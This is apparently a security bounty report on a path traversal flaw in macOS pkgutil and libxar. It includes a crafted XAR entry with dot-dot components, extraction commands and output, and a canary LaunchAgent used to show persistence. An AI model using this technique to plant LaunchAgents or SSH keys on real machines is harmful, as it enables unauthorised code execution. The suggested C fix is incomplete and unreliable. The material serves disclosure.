# Security Report: Path Traversal in macOS pkgutil / libxar (XAR-SYMLINK-2)

**Program:** Apple Security Bounty  
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory — 'Path Traversal')  
**Severity:** High  
**Affected Component:** `/usr/sbin/pkgutil` — libxar (macOS)  
**Tested On:** macOS 26.6.2 (Tahoe), BuildVersion 25G83, xar 1.8dev  

---

## Summary

`pkgutil --expand` does **not** sanitize `..` (dot-dot) components in XAR archive entry filenames.  
A specially crafted XAR archive can cause `pkgutil` to write files **outside** the intended extraction directory — including to arbitrary user-writable paths such as `~/Library/LaunchAgents/`.

---

## Vulnerability Details

### Root Cause

When `pkgutil --expand <archive> <outdir>` processes a XAR archive, libxar resolves each entry's filename **relative to `<outdir>`** without first normalizing or rejecting path components containing `..`.

A filename such as:

```
../../../../../../Users/runner/Library/LaunchAgents/evil.plist
```

is resolved by the OS as:

```
<outdir>/../../../../../../Users/runner/Library/LaunchAgents/evil.plist
→ /Users/runner/Library/LaunchAgents/evil.plist
```

This allows writing to any path writable by the invoking user.

### Contrast with `xar` CLI

The `xar` command-line tool **does** sanitize path separators — it replaces `/` with `:` in filenames. However, `pkgutil` (which calls libxar directly) does **not** apply this sanitization.

### `O_NOFOLLOW_ANY` Does Not Protect Against This

`O_NOFOLLOW_ANY` (macOS-specific flag) blocks symlink following but does **not** block `..` traversal. A `..` component is a directory entry, not a symbolic link, and is resolved by the kernel's normal path resolution.

---

## Proof of Concept

### Attack XAR Structure

A minimal crafted XAR archive with a single entry:

```xml
<xar><toc>
  <checksum style="sha1"><offset>0</offset><size>20</size></checksum>
  <file id="1">
    <name>../../../../../../Users/runner/Library/LaunchAgents/evil.plist</name>
    <type>file</type>
    <data>
      <offset>20</offset>
      <size>405</size>
      <length>267</length>
      <encoding style="application/x-gzip"/>
    </data>
  </file>
</toc></xar>
```

### Extraction Command

```bash
pkgutil --expand crafted.xar /tmp/outdir
```

### Observed Result (Gate A — run39)

```
OUTDIR: /tmp/gate_a39_pkgutil.9OuJYp/out
pkgutil exit: 0
GATE_A_PKGUTIL=PASS
Content: XAR_DOTDOT_GATE_A_RUN39
File written: /tmp/xar_gated_canary_macos.txt
```

File written **outside** the extraction directory, to `/tmp/xar_gated_canary_macos.txt`.

### Gate B — Persistence Vector (run42)

Payload: a LaunchAgent plist written to `~/Library/LaunchAgents/`:

```bash
pkgutil --expand gate_b.xar /tmp/gate_b42_pkgutil.WLWi08/out
pkgutil exit: 0
GATE_B_PKGUTIL=PASS
File written: /Users/runner/Library/LaunchAgents/xar_gate_b.plist
```

Content of written plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.xar.gate_b_canary</string>
  <key>ProgramArguments</key>
  <array><string>/usr/bin/touch</string>
         <string>/tmp/xar_gate_b_canary_macos.txt</string></array>
  <key>RunAtLoad</key><true/>
</dict>
</plist>
```

**Impact:** On next user login, launchd loads the planted plist and executes the attacker-controlled command.

---

## Impact

| Scenario | Impact |
|---|---|
| Arbitrary file write outside extraction dir | High |
| Write to `~/Library/LaunchAgents/` | **Persistence** — code executes on next login |
| Write to `~/.ssh/authorized_keys` | SSH key injection |
| Write to `~/Library/Application Support/<App>/` | App data tampering |
| Write to `/etc/` (if root invocation) | System-wide compromise |

The vulnerability is triggered whenever `pkgutil --expand` is called on an attacker-controlled XAR archive. macOS Installer (`.pkg` files are XAR archives) and third-party package managers that use `pkgutil` are affected.

---

## Affected Versions

- macOS 26.6.2 (Tahoe), BuildVersion 25G83, xar 1.8dev — **confirmed vulnerable**
- Earlier macOS versions likely affected (libxar path traversal fix not present in tested version)

---

## Evidence

All runs executed on GitHub Actions macOS runners (macos-latest = macOS 26.6.2 Tahoe arm64):

| Run | Gate | Result | URL |
|---|---|---|---|
| run39 #1 | Gate A (pkgutil path traversal) | PASS | https://github.com/YuvalFradkin1/new2/actions/runs/37563403715 |
| run39 #2 | Gate D (independent operator) | PASS | https://github.com/YuvalFradkin1/new2/actions/runs/37565705881 |
| run42 #1 | Gate B (LaunchAgents persistence) | PASS | https://github.com/YuvalFradkin1/new2/actions/runs/37586546450 |

Source code: https://github.com/YuvalFradkin1/new2

---

## Recommended Fix

In `libxar`, before resolving a file entry's path relative to the extraction root, normalize the path and reject or strip any `..` components:

```c
// Before extracting entry with name `fname` to `outdir`:
char resolved[PATH_MAX];
snprintf(candidate, sizeof(candidate), "%s/%s", outdir, fname);
if (realpath(candidate, resolved) == NULL ||
    strncmp(resolved, outdir, strlen(outdir)) != 0) {
    // Path traversal detected — skip or abort
    return XAR_ITER_ABORT;
}
```

Alternatively, reject any filename containing `..` as a path component.

---

## Reporter

Yuval Fradkin — Independent Security Researcher  
yuvalfradkin@gmail.com
